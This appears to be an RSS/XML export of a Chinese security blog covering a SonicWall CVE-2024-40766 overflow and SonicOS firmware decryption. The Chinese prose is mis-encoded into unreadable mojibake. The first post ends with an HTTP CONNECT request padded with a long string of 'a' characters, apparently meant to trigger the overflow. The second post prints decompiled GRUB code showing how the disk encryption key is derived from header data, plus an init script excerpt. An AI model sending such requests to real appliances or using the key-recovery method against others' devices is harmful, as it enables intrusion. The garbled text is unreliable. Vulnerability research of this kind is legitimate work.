<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">CONNECT /test?(wxaappliance)-&gt;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Proxy-Authorization: test</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>è¯¥äºŒè¿›åˆ¶ç¨‹åºä¹Ÿæ²¡æœ‰å¼€å¯ canary ç­‰ä¿æŠ¤æªæ–½ï¼Œæ‰€ä»¥ç†è®ºä¸Šå¯ä»¥åˆ©ç”¨æ­¤æ¼æ´å®ç°å‘½ä»¤æ‰§è¡Œï¼Œv32 å˜é‡ä¸‹æ–¹å¯èƒ½å­˜åœ¨æŸäº›å…³é”®æ•°æ®ç»“æ„ï¼Œä¹Ÿè®¸é€šè¿‡æº¢å‡ºè¦†ç›–è¿™äº›ç»“æ„å°±å¯ä»¥å®ç°æœªæˆæƒè®¿é—®ç­‰ã€‚</p>
<p>ç”±äºæˆ‘æ²¡æœ‰åˆé€‚çš„è®¾å¤‡è¿›è¡Œæµ‹è¯•ï¼Œè¯¥æ¼æ´èƒ½å¦åˆ©ç”¨ï¼Ÿå¦‚ä½•åˆ©ç”¨ï¼Ÿå°±ç•™ç»™æ„Ÿå…´è¶£çš„è¯»è€…ç ”ç©¶äº†ã€‚</p>
<h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p>æœ¬æ–‡ç®€è¦ä»‹ç»äº† CVE-2024-40766 æ¼æ´ï¼Œé€šè¿‡è¡¥ä¸å¯¹æ¯”æ‰¾åˆ°äº†æ¼æ´å¯èƒ½çš„ä½ç½®å¹¶åˆ†æäº†æ¼æ´æˆå› ã€‚è¯¥æ¼æ´è¯„åˆ†ä¸º 9.3 å±ä¸¥é‡æ¼æ´ï¼Œå»ºè®®ä½¿ç”¨ SonicWall ç›¸å…³è®¾å¤‡çš„ç”¨æˆ·åŠæ—¶æ›´æ–°æœ€æ–°è¡¥ä¸ã€‚</p>
<p><a class="link"   href="https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2024-0015" >https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2024-0015<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a href="https://wzt.ac.cn/2022/02/08/sonicwall_dec1/">https://wzt.ac.cn/2022/02/08/sonicwall_dec1/</a></p>
<p><a href="https://wzt.ac.cn/2024/09/05/sonicwall_dec2/">https://wzt.ac.cn/2024/09/05/sonicwall_dec2/</a></p>
]]></content>
      <categories>
        <category>æ¼æ´åˆ†æ</category>
      </categories>
  </entry>
  <entry>
    <title>SonicOS å›ºä»¶è§£å¯† (2)</title>
    <url>/2024/09/05/sonicwall_dec2/</url>
    <content><![CDATA[<p>æœ¬æ–‡ä»‹ç»ä¸€äº› SonicWall SonicOS å›ºä»¶è§£å¯†çš„æ€è·¯ã€‚</p>
<span id="more"></span>

<p>æœ¬ Blog æ›¾å‘å¸ƒè¿‡ä¸€ç¯‡å…³äºå¦‚ä½•è§£å¯† SonicWall NSv ç³»ç»Ÿçš„<a href="https://wzt.ac.cn/2022/02/08/sonicwall-nsv-unpack">æ–‡ç« </a>ï¼Œæ¼«é•¿çš„æ—¶é—´è¿‡å»äº†ï¼Œå‚å•†ä¹Ÿå¯¹è¯¥ç³»ç»Ÿè¿›è¡Œäº†æ•°æ¬¡å‡çº§è¿­ä»£ï¼Œç°åœ¨æˆ‘ä»¬æ¥çœ‹çœ‹æ–°ç‰ˆæœ¬ä¸­æ˜¯å¦å®ç°äº†æ›´å¤šå®‰å…¨æªæ–½ã€‚</p>
<p>æœ¬æ–‡æåŠçš„ç¯å¢ƒå¯ä»¥åœ¨<a class="link"   href="https://pan.baidu.com/s/1MJG7QU4tU9M6ZCNVL89lIQ?pwd=raw4" >ç½‘ç›˜<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>è·å–ï¼Œç›¸å…³å·¥å…·å¯ä»¥åœ¨ <a class="link"   href="https://github.com/rrrrrrri/sonicwall-gadgets" >Github<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> è·å–ã€‚</p>
<h2 id="SonicOS-7-0"><a href="#SonicOS-7-0" class="headerlink" title="SonicOS 7.0"></a>SonicOS 7.0</h2><p>å‰ç¯‡æ–‡ç« åˆ†æçš„ç³»ç»ŸåŸºäº SonicOS 6.0ï¼ŒSonicWall äº 2023 å¹´å‘å¸ƒäº†æ–°çš„ GEN 7 ç³»ç»Ÿï¼Œæ ¹æ®å‘å¸ƒè¯´æ˜ï¼Œè¯¥ç³»ç»Ÿåœ¨å¤šä¸ªæ–¹é¢è¿›è¡Œäº†æ”¹è¿›ã€‚æˆ‘ä»¬ä»¥ 7.0.1_5161 ä¸ºä¾‹æ¥çœ‹çœ‹æ–°çš„ç³»ç»Ÿæ˜¯å¦ä¿®æ”¹äº†ç£ç›˜åŠ å¯†é€»è¾‘ã€‚</p>
<p>å¯¼å…¥è™šæ‹Ÿé•œåƒåå¯åŠ¨ï¼Œç­‰å¾…ç³»ç»Ÿå®Œæˆå®‰è£…è¿‡ç¨‹ï¼Œä¹‹åå°†ç£ç›˜æŒ‚è½½åˆ° Linux ä¸­åˆ†æï¼Œé€šè¿‡ lsblk å‘½ä»¤å¯ä»¥çœ‹åˆ°ç£ç›˜å…·æœ‰ 7 ä¸ªåˆ†åŒº</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sdb                                                                                     </span><br><span class="line">â”œâ”€sdb1 vfat        FAT16 EFI-SYSTEM 3115-E9D4                                           </span><br><span class="line">â”œâ”€sdb2                                                                                  </span><br><span class="line">â”œâ”€sdb3 crypto_LUKS 1                a75000be-2dc9-11e8-bddb-67945b040d06                </span><br><span class="line">â”œâ”€sdb4                                                                                  </span><br><span class="line">â”œâ”€sdb6 crypto_LUKS 1                664f41bc-3bdb-11e8-a9f1-37e7a8e911e8                </span><br><span class="line">â”œâ”€sdb7 crypto_LUKS 1                77f38900-3d70-11e8-9e8c-8b99c51126e1                </span><br><span class="line">â””â”€sdb9 crypto_LUKS 1                9943fac6-37f1-11e8-bbd4-4b1d323a5df2</span><br></pre></td></tr></table></figure></div>

<p>å…¶ä¸­ 3ã€6ã€7ã€9 è¿™ 4 ä¸ªåˆ†åŒºä¾ç„¶æ˜¯ LUKS åŠ å¯†çš„ï¼Œå¯ä»¥æ¨æµ‹åœ¨ 7.0 ç‰ˆæœ¬çš„ç³»ç»Ÿä¸­ï¼Œè¿˜æ²¡æœ‰ä¿®æ”¹ç£ç›˜åŠ å¯†é€»è¾‘ã€‚</p>
<p>å‰ç¯‡æ–‡ç« æ˜¯é€šè¿‡è°ƒè¯• luks æ¨¡å—ä»å†…å­˜ä¸­ dump å¯†é’¥å®ç°ç£ç›˜è§£å¯†ï¼Œè¿™ç§æ–¹æ³•æ¯”è¾ƒéº»çƒ¦ä¸”å®¹æ˜“å‡ºç°é”™è¯¯ï¼Œè¿™æ¬¡æˆ‘ä»¬æ¥åˆ†æä¸€ä¸‹å…·ä½“çš„å¯†é’¥ç”Ÿæˆç®—æ³•æ˜¯ä»€ä¹ˆã€‚</p>
<p>è§£å¯†é€»è¾‘ä½äº luks.mod ä¸­ï¼Œå…³é”®å‡½æ•° <code>sub_0</code>ã€‚è¯¥æ¨¡å—åº”è¯¥å±äº <a class="link"   href="https://www.gnu.org/software/grub/grub-download.html" >grub é¡¹ç›®<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>çš„ä¸€éƒ¨åˆ†ï¼Œé€šè¿‡æœç´¢æ‰¾åˆ°æºä»£ç ä½äº luks.c çš„ <code>luks_recover_key</code> å‡½æ•°ã€‚å¯¹æ¯”æºç å‘ç°ï¼ŒSonicWall çš„å¼€å‘è€…ä¿®æ”¹äº† LUKS ç›¸å…³é€»è¾‘ï¼Œåœ¨ <code>luks_recover_key</code> å‡½æ•°ä¸­ä¼šå°è¯•ä»æœ¬åœ°æ–‡ä»¶æˆ–è€…ç£ç›˜å¤´éƒ¨è¯»å–å¯†é’¥ä¿¡æ¯ï¼Œå¹¶è‡ªåŠ¨å¯¹ç£ç›˜è¿›è¡Œè§£å¯†ã€‚</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">luks_recover_key</span><span class="params">(_QWORD *a1, __int64 a2, __int64 a3, __int64 *a4, __int64 a5)</span></span><br><span class="line">&#123;</span><br><span class="line">  v5 = &amp;v53;</span><br><span class="line">  v7 = <span class="number">62LL</span>;</span><br><span class="line">  v52 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v7 )</span><br><span class="line">  &#123;</span><br><span class="line">    *v5 = <span class="number">0</span>;</span><br><span class="line">    v5 += <span class="number">4</span>;</span><br><span class="line">    --v7;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( a3 )</span><br><span class="line">  &#123;</span><br><span class="line">    grub_file_seek(a3, <span class="number">0LL</span>);</span><br><span class="line">    v9 = grub_file_read(a3, disk_data, <span class="number">592LL</span>);</span><br><span class="line">    result = <span class="number">14LL</span>;</span><br><span class="line">    v11 = v9 == <span class="number">592</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = grub_disk_read(a1, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">592LL</span>, disk_data);    <span class="comment">// [1]</span></span><br><span class="line">    v11 = result == <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !v11 )</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  grub_puts_(<span class="string">&quot;Loading...&quot;</span>);    <span class="comment">// [2]</span></span><br><span class="line">  v12 = _byteswap_ulong(disk_data[<span class="number">27</span>]);</span><br><span class="line">  v38 = v12;</span><br><span class="line">  <span class="keyword">if</span> ( v12 &gt; <span class="number">0x80</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v16 = <span class="string">&quot;key is too long&quot;</span>;</span><br><span class="line">    v17 = <span class="number">9LL</span>;</span><br><span class="line">    <span class="keyword">return</span> grub_error(v17, v16);</span><br><span class="line">  &#125;</span><br><span class="line">  v13 = <span class="number">0LL</span>;</span><br><span class="line">  v14 = <span class="number">1LL</span>;</span><br><span class="line">  v15 = &amp;disk_data[<span class="number">63</span>];        <span class="comment">// [3]</span></span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( disk_data[v13 + <span class="number">52</span>] == <span class="number">0xF371AC00</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v18 = _byteswap_ulong(disk_data[v13 + <span class="number">63</span>]);</span><br><span class="line">      <span class="keyword">if</span> ( v14 &lt; v18 )</span><br><span class="line">        v14 = v18;</span><br><span class="line">    &#125;</span><br><span class="line">    v13 += <span class="number">12LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v13 != <span class="number">96</span> );</span><br><span class="line">  v19 = grub_malloc(v38 * v14, &amp;disk_data[<span class="number">63</span>], <span class="number">384LL</span>, &amp;disk_data[<span class="number">52</span>]);</span><br><span class="line">  v20 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !v19 )</span><br><span class="line">    <span class="keyword">return</span> grub_errno;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v21 = *(&amp;disk_data[<span class="number">28</span>] + v20++);</span><br><span class="line">    v47[v20 + <span class="number">19</span>] = v21;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v20 != <span class="number">20</span> );</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i != <span class="number">32</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    LOBYTE(v15) = *(&amp;disk_data[<span class="number">33</span>] + i);</span><br><span class="line">    v47[i + <span class="number">40</span>] = v15;</span><br><span class="line">  &#125;</span><br><span class="line">  v23 = &amp;v48;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0LL</span>; j != <span class="number">52</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    v25 = &amp;v49[-j - <span class="number">1</span>];</span><br><span class="line">    LOBYTE(v25) = v47[j + <span class="number">20</span>] ^ v49[-j - <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">if</span> ( v25 &lt;= <span class="number">0x1F</span>u )</span><br><span class="line">      v25 = (v25 | <span class="number">0x20</span>);</span><br><span class="line">    v49[j] = v25;</span><br><span class="line">  &#125;</span><br><span class="line">  v45 = <span class="number">1</span>;</span><br><span class="line">  v26 = <span class="number">2</span> - (a4 == <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v43 = a5;</span><br><span class="line">    <span class="keyword">if</span> ( !a4 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">LABEL_38:</span><br><span class="line">    v31 = &amp;disk_data[<span class="number">54</span>];</span><br><span class="line">    <span class="keyword">for</span> ( k = <span class="number">0</span>; k != <span class="number">8</span>; ++k )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(v31 - <span class="number">2</span>) == <span class="number">-210654208</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        grub_real_dprintf(<span class="string">&quot;disk/luks.c&quot;</span>, <span class="number">246LL</span>, <span class="string">&quot;luks&quot;</span>, <span class="string">&quot;Trying keyslot %d\n&quot;</span>, k);</span><br><span class="line">        v32 = grub_crypto_pbkdf2(*(a2 + <span class="number">88</span>), a4, v43, v31, <span class="number">32LL</span>, _byteswap_ulong(*(v31 - <span class="number">1</span>)), v51, v38);    <span class="comment">// [5]</span></span><br><span class="line">        <span class="keyword">if</span> ( v32 )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_51;</span><br><span class="line">        grub_real_dprintf(<span class="string">&quot;disk/luks.c&quot;</span>, <span class="number">263LL</span>, <span class="string">&quot;luks&quot;</span>, <span class="string">&quot;PBKDF2 done\n&quot;</span>);</span><br><span class="line">        v33 = grub_cryptodisk_setkey(a2, v51, v38);</span><br><span class="line">        <span class="keyword">if</span> ( v33 )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_55;</span><br><span class="line">        v34 = _byteswap_ulong(v31[<span class="number">8</span>]);</span><br><span class="line">        v35 = v38 * _byteswap_ulong(v31[<span class="number">9</span>]);</span><br><span class="line">        <span class="keyword">if</span> ( a3 )</span><br><span class="line">        &#123;</span><br><span class="line">          grub_file_seek(a3, v34 &lt;&lt; <span class="number">9</span>);</span><br><span class="line">          <span class="keyword">if</span> ( grub_file_read(a3, v19, v35) != v35 )</span><br><span class="line">          &#123;</span><br><span class="line">            v36 = <span class="number">14</span>;</span><br><span class="line">LABEL_46:</span><br><span class="line">            v39 = v36;</span><br><span class="line">            grub_free(v19);</span><br><span class="line">            <span class="keyword">return</span> v39;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v36 = grub_disk_read(a1, v34, <span class="number">0LL</span>, v35, v19);</span><br><span class="line">          <span class="keyword">if</span> ( v36 )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_46;</span><br><span class="line">        &#125;</span><br><span class="line">        v33 = grub_cryptodisk_decrypt(a2, v19, v35, <span class="number">0LL</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v33 )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_55;</span><br><span class="line">        v33 = AF_merge(*(a2 + <span class="number">88</span>), v19, v50, v38, _byteswap_ulong(v31[<span class="number">9</span>]));</span><br><span class="line">        <span class="keyword">if</span> ( v33 )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_55;</span><br><span class="line">        grub_real_dprintf(<span class="string">&quot;disk/luks.c&quot;</span>, <span class="number">306LL</span>, <span class="string">&quot;luks&quot;</span>, <span class="string">&quot;candidate key recovered\n&quot;</span>);</span><br><span class="line">        v32 = grub_crypto_pbkdf2(</span><br><span class="line">                *(a2 + <span class="number">88</span>),</span><br><span class="line">                v50,</span><br><span class="line">                _byteswap_ulong(disk_data[<span class="number">27</span>]),</span><br><span class="line">                &amp;disk_data[<span class="number">33</span>],</span><br><span class="line">                <span class="number">32LL</span>,</span><br><span class="line">                _byteswap_ulong(disk_data[<span class="number">41</span>]),</span><br><span class="line">                v47,</span><br><span class="line">                <span class="number">20LL</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v32 )</span><br><span class="line">        &#123;</span><br><span class="line">LABEL_51:</span><br><span class="line">          v40 = v32;</span><br><span class="line">          grub_free(v19);</span><br><span class="line">          v37 = v40;</span><br><span class="line">          <span class="keyword">return</span> grub_crypto_gcry_error(v37);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( !grub_memcmp(v47, &amp;disk_data[<span class="number">28</span>], <span class="number">20LL</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          v33 = grub_cryptodisk_setkey(a2, v50, v38);</span><br><span class="line">          <span class="keyword">if</span> ( v33 )</span><br><span class="line">          &#123;</span><br><span class="line">LABEL_55:</span><br><span class="line">            grub_free(v19);</span><br><span class="line">            v37 = v33;</span><br><span class="line">            <span class="keyword">return</span> grub_crypto_gcry_error(v37);</span><br><span class="line">          &#125;</span><br><span class="line">          grub_free(v19);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        v15 = &amp;loc_148;</span><br><span class="line">        grub_real_dprintf(<span class="string">&quot;disk/luks.c&quot;</span>, <span class="number">328LL</span>, <span class="string">&quot;luks&quot;</span>, <span class="string">&quot;bad digest\n&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      v31 += <span class="number">12</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v26 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v26 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v15 = (sub_0 + <span class="number">1</span>);</span><br><span class="line">      v26 = <span class="number">1</span>;</span><br><span class="line">      grub_printf_(<span class="string">&quot;%u attempt%s remaining.\n&quot;</span>, <span class="number">1</span>, &amp;unk_B64);</span><br><span class="line">    &#125;</span><br><span class="line">    a4 = <span class="number">0LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !v26 )</span><br><span class="line">    &#123;</span><br><span class="line">      grub_free(v19);</span><br><span class="line">      v16 = <span class="string">&quot;access denied&quot;</span>;</span><br><span class="line">      v17 = <span class="number">30LL</span>;</span><br><span class="line">      <span class="keyword">return</span> grub_error(v17, v16);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v45 )</span><br><span class="line">  &#123;</span><br><span class="line">    a4 = v49;    <span class="comment">// [4]</span></span><br><span class="line">    v45 = <span class="number">0</span>;</span><br><span class="line">    v43 = <span class="number">52LL</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_38;</span><br><span class="line">  &#125;</span><br><span class="line">  name = <span class="number">0LL</span>;</span><br><span class="line">  v28 = a1[<span class="number">5</span>];</span><br><span class="line">  <span class="keyword">if</span> ( v28 )</span><br><span class="line">    name = grub_partition_get_name(v28, v15, v25, v23);</span><br><span class="line">  v29 = &amp;unk_B64;</span><br><span class="line">  v30 = &amp;unk_B64;</span><br><span class="line">  <span class="keyword">if</span> ( name )</span><br><span class="line">    v30 = name;</span><br><span class="line">  <span class="keyword">if</span> ( a1[<span class="number">5</span>] )</span><br><span class="line">    v29 = &amp;unk_B65;</span><br><span class="line">  grub_printf_(<span class="string">&quot;Enter passphrase for %s%s%s (%s): &quot;</span>, *a1, v29, v30, a2 + <span class="number">140</span>);</span><br><span class="line">  grub_free(name);</span><br><span class="line">  v15 = (&amp;loc_FE + <span class="number">2</span>);</span><br><span class="line">  <span class="keyword">if</span> ( grub_password_get(&amp;v52, <span class="number">256LL</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    a4 = &amp;v52;</span><br><span class="line">    v43 = grub_strlen(&amp;v52);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_38;</span><br><span class="line">  &#125;</span><br><span class="line">  grub_free(v19);</span><br><span class="line">  v16 = <span class="string">&quot;Passphrase not supplied&quot;</span>;</span><br><span class="line">  v17 = <span class="number">18LL</span>;</span><br><span class="line">  <span class="keyword">return</span> grub_error(v17, v16);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>ç®€è¦åˆ†æä¸Šé¢çš„ä»£ç ï¼Œé¦–å…ˆåœ¨ <code>[1]</code> å¤„ï¼Œä»£ç ä¼šè°ƒç”¨ <code>grub_disk_read</code> å°è¯•ä»ç£ç›˜è¯»å– 592 å­—èŠ‚çš„æ•°æ®ï¼Œåœ¨ <code>[2]</code> å¤„ï¼Œè°ƒç”¨ <code>grub_puts</code> å‡½æ•°è¾“å‡ºäº† <code>Loading...</code> å­—ç¬¦ä¸²ï¼Œåœ¨å¼€æœºæ—¶å¯ä»¥çœ‹åˆ°è¿™ä¸ªå­—ç¬¦ä¸²ã€‚</p>
<p>ä» <code>[3]</code> å¤„å¼€å§‹ï¼Œä»£ç ä½¿ç”¨ä»ç£ç›˜è¯»å–çš„ 592 å­—èŠ‚æ•°æ®è¿›è¡Œä¸€äº›å¤æ‚è¿ç®—ï¼Œæœ€ç»ˆä¼šå°†è®¡ç®—ç»“æœä¿å­˜åœ¨å˜é‡ v49 ä¸­ã€‚åœ¨ <code>[5]</code> å¤„ä¼šè°ƒç”¨ <code>grub_crypto_pbkdf2</code> è§£å¯†ç£ç›˜ï¼Œæˆ‘ä»¬çŸ¥é“å®ƒçš„ç¬¬äºŒä¸ªå‚æ•°åº”è¯¥æ˜¯å¯†é’¥ï¼Œä½†åœ¨è°ƒç”¨è¯¥å‡½æ•°ä¹‹å‰éƒ½æ²¡æœ‰æ“ä½œå˜é‡ a4 çš„é€»è¾‘ã€‚</p>
<p>ç»§ç»­å‘ä¸‹åˆ†æä»£ç å‘ç°åœ¨ <code>[4]</code> å¤„ä¼šå°† a4 èµ‹å€¼ä¸º v49ï¼Œè¯´æ˜å¯†é’¥ç¡®å®å’Œç£ç›˜å¤´éƒ¨æ•°æ®æœ‰å…³ã€‚é‚£ä¹ˆå°†ç”Ÿæˆå¯†é’¥çš„é€»è¾‘æ¢³ç†å‡ºæ¥å½¢æˆç¨‹åºï¼Œåœ¨æœ¬åœ°å°±å¯ä»¥ç›´æ¥è§£å¯†ç¡¬ç›˜ï¼Œæ— éœ€å¤æ‚çš„è°ƒè¯•è¿‡ç¨‹ã€‚</p>
<p>å…·ä½“å®ç°è¯·å‚è€ƒä»“åº“ä»£ç ã€‚</p>
<h2 id="SonicOS-7-1"><a href="#SonicOS-7-1" class="headerlink" title="SonicOS 7.1"></a>SonicOS 7.1</h2><p>ç›®å‰ SonicOS çš„æœ€æ–°ç‰ˆæœ¬ä¸º 7.1.2ï¼Œå’Œå‰é¢ç›¸åŒçš„æ€è·¯æŒ‚è½½ç¡¬ç›˜åå‘ç°åˆ†åŒºä¿¡æ¯æœ‰å˜åŒ–</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sdb                                                                                   </span><br><span class="line">â”œâ”€sdb1 vfat   FAT16 BOOT          EBD9-9F71                                           </span><br><span class="line">â”œâ”€sdb2 vfat   FAT16 BOOT_A        CE80-C973                                           </span><br><span class="line">â”œâ”€sdb3 vfat   FAT16 BOOT_B        8752-5DF4                                           </span><br><span class="line">â”œâ”€sdb4 vfat   FAT16 SYSTEM_BOOT   31CF-394A                                           </span><br><span class="line">â”œâ”€sdb5 ext4   1.0   INSTALL-CACHE 829fb2a8-48d1-4416-8d60-a63cc4bcea77                </span><br><span class="line">â””â”€sdb6</span><br></pre></td></tr></table></figure></div>

<p>å‰é¢ 4 ä¸ªä¼¼ä¹éƒ½æ˜¯å¯åŠ¨åˆ†åŒºï¼Œsdb5 å¯ä»¥ç›´æ¥æŒ‚è½½ï¼Œä½†å…¶ä¸­åªä¿å­˜äº†ç³»ç»Ÿå½“å‰æ­£åœ¨è¿è¡Œçš„ <code>.bin.sig</code> å›ºä»¶æ–‡ä»¶ï¼Œä¸”è¯¥æ–‡ä»¶æ˜¯åŠ å¯†çš„ï¼Œsdb6 çš„æ ¼å¼æ— æ³•è¯†åˆ«ã€‚</p>
<p>æŒ‚è½½ BOOT åˆ†åŒºï¼Œæ–‡ä»¶å†…å®¹ä¹Ÿå’Œè€ç‰ˆæœ¬ä¸åŒï¼Œç°åœ¨ GRUB è¢«æ‰“åŒ…æˆäº† EFI&#x2F;BOOT&#x2F;bootx64.efi æ–‡ä»¶ï¼Œæ­¤å¤–è¿˜æœ‰ SYSTEM.LIC å’Œ SYSTEM.SYS ä¸¤ä¸ªæ–‡ä»¶ï¼ŒSYSTEM.LIC æ˜¯ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œè§£å‹å¯ä»¥å¾—åˆ° <code>DATA:FW-crypt-release.key-877cebb9-f923-4245-9952-18a00ce5f77d</code> ç­‰æ•°ä¸ªç±»ä¼¼å¯†é’¥çš„æ–‡æ¡£ï¼Œä½†æ ¼å¼éƒ½æ— æ³•è¯†åˆ«ã€‚</p>
<p>ä½¿ç”¨ binwalk åˆ†æå¹¶è§£å‹ bootx64.efi æ–‡ä»¶ï¼Œå¾—åˆ°ä¸€ä¸ªå«åš soniccorex.bin çš„ Linux å†…æ ¸æ–‡ä»¶ï¼Œå®ƒåº”è¯¥å°±æ˜¯è™šæ‹Ÿæœº Linux ç³»ç»Ÿçš„å†…æ ¸ã€‚</p>
<p>è§£å¯†ç£ç›˜è¿™ä¸ªè¡Œä¸ºæœ‰å¯èƒ½å‘ç”Ÿåœ¨å†…æ ¸æˆ–è€… initramfs ä¸­ï¼ŒæŒ‰ç…§ä»¥å¾€çš„æ€è·¯å…ˆå®šä½åˆ° populate_rootfsï¼Œè¯¥å‡½æ•°è´Ÿè´£è§£å‹ initramfs é•œåƒã€‚é€šè¿‡è°ƒè¯•å†…æ ¸çš„æ–¹å¼åœ¨ populate_rootfs ä¸‹æ–­ç‚¹ï¼Œä»å†…å­˜ä¸­å¯ä»¥æå– initramfs å‹ç¼©åŒ…ã€‚</p>
<p>è§£å‹åå¾—åˆ°ä¸€ä¸ªæ ‡å‡†çš„ Linux æ–‡ä»¶ç³»ç»Ÿï¼Œå…¶ä¸­åŒ…å«ä¸€äº›å…³é”®æ–‡ä»¶ï¼Œä¾‹å¦‚ <code>onetime.key.enc</code>ã€<code>sunup.cpio.gz.enc</code> ç­‰ã€‚åˆ†æ &#x2F;init è¿™ä¸ªåˆå§‹åŒ–è„šæœ¬ï¼Œé‡Œé¢åŒ…å«å¤§é‡å’Œè§£å¯†ç›¸å…³çš„ä»£ç ï¼Œè¿™é‡Œåˆ—ä¸¾éƒ¨åˆ†å…³é”®ä»£ç ï¼Œç®€è¦åˆ†æè¿™ä¸ªè„šæœ¬çš„é€»è¾‘ã€‚</p>
<p>è„šæœ¬ä¸»è¦æ‰§è¡Œä»¥ä¸‹å‡ ä¸ªæ“ä½œ</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">early_setup</span><br><span class="line"></span><br><span class="line"><span class="built_in">test</span> <span class="string">&quot;<span class="variable">$VERBOSE</span>&quot;</span> = <span class="string">&quot;0&quot;</span> &amp;&amp; <span class="built_in">exec</span> 2&gt;/tmp/preload.log</span><br><span class="line"></span><br><span class="line">[ -z <span class="string">&quot;<span class="variable">$CONSOLE</span>&quot;</span> ] &amp;&amp; CONSOLE=<span class="string">&quot;/dev/console&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># read and process command line args (for dev pass verbose debugshell)</span></span><br><span class="line"><span class="comment">#read_args</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># decrypt stage2 initramfs (sunup)</span></span><br><span class="line">setup_stage2</span><br><span class="line"></span><br><span class="line"><span class="comment"># jump to stage2</span></span><br><span class="line">mount_and_boot</span><br></pre></td></tr></table></figure></div>

